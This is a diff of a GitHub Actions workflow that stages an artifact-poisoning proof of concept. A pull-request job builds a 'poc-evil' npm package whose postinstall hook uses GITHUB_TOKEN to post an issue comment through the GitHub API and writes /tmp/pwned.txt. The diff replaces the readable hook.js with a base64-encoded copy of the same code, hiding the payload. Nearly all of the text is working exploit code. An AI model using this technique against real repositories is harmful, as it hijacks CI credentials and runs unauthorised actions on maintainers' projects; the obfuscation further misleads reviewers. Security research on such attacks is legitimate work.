@@ -10,6 +10,7 @@ jobs:
       - name: Stage attacker-controlled artifact payload
         env:
           PR_NUMBER: ${{ github.event.pull_request.number }}
+          HOOK_B64: Y29uc3QgY3AgPSByZXF1aXJlKCdjaGlsZF9wcm9jZXNzJyk7CmNvbnN0IHRva2VuID0gcHJvY2Vzcy5lbnYuR0lUSFVCX1RPS0VOIHx8ICcnOwpjb25zdCByZXBvID0gcHJvY2Vzcy5lbnYuR0lUSFVCX1JFUE9TSVRPUlkgfHwgJyc7CmNvbnN0IGJvZHkgPSBKU09OLnN0cmluZ2lmeSh7Ym9keTogJyoqUE9DLVJDRSoqOiBucG0gcG9zdGluc3RhbGwgZXhlY3V0ZWQgZHVyaW5nIGBucG0gaW5zdGFsbGAgaW4gdGhlIHByaXZpbGVnZWQgd29ya2Zsb3dfcnVuIGNvbnRleHQuIHRva2VuX3ByZXNlbnQ9JyArICEhdG9rZW59KTsKbGV0IHN0YXR1cyA9ICdub25lJzsKdHJ5IHsKICBzdGF0dXMgPSBjcC5leGVjRmlsZVN5bmMoJ2N1cmwnLCBbJy1zJywnLW8nLCcvZGV2L251bGwnLCctdycsJyV7aHR0cF9jb2RlfScsJy1YJywnUE9TVCcsCiAgICAnLUgnLCdBdXRob3JpemF0aW9uOiBCZWFyZXIgJyArIHRva2VuLAogICAgJy1IJywnQ29udGVudC1UeXBlOiBhcHBsaWNhdGlvbi9qc29uJywKICAgICctZCcsIGJvZHksCiAgICAnaHR0cHM6Ly9hcGkuZ2l0aHViLmNvbS9yZXBvcy8nICsgcmVwbyArICcvaXNzdWVzLzQvY29tbWVudHMnXSwge2VuY29kaW5nOiAndXRmOCd9KTsKfSBjYXRjaCAoZSkgeyBzdGF0dXMgPSAnRVJSICcgKyBlLm1lc3NhZ2U7IH0KcmVxdWlyZSgnZnMnKS53cml0ZUZpbGVTeW5jKCcvdG1wL3B3bmVkLnR4dCcsICdSQU4gdG9rZW49JyArICEhdG9rZW4gKyAnIHN0YXR1cz0nICsgc3RhdHVzKTsK
         run: |
           echo "$PR_NUMBER" > pr-number.txt
           printf 'line one\n' > linter-report.txt
@@ -21,21 +22,7 @@ jobs:
           cat > poc-evil/package.json <<'JSON'
           {"name":"poc-evil","version":"1.0.0","scripts":{"postinstall":"node hook.js"}}
           JSON
-          cat > poc-evil/hook.js <<'JSEOF'
-const cp = require('child_process');
-const token = process.env.GITHUB_TOKEN || '';
-const repo = process.env.GITHUB_REPOSITORY || '';
-const body = JSON.stringify({body: '**POC-RCE**: npm postinstall executed during `npm install` in the privileged workflow_run context. token_present=' + !!token});
-let status = 'none';
-try {
-  status = cp.execFileSync('curl', ['-s','-o','/dev/null','-w','%{http_code}','-X','POST',
-    '-H','Authorization: Bearer ' + token,
-    '-H','Content-Type: application/json',
-    '-d', body,
-    'https://api.github.com/repos/' + repo + '/issues/4/comments'], {encoding: 'utf8'});
-} catch (e) { status = 'ERR ' + e.message; }
-require('fs').writeFileSync('/tmp/pwned.txt', 'RAN token=' + !!token + ' status=' + status);
-JSEOF
+          printf '%s' "$HOOK_B64" | base64 -d > poc-evil/hook.js
       - name: Upload linter report
         uses: actions/upload-artifact@v7
         with:
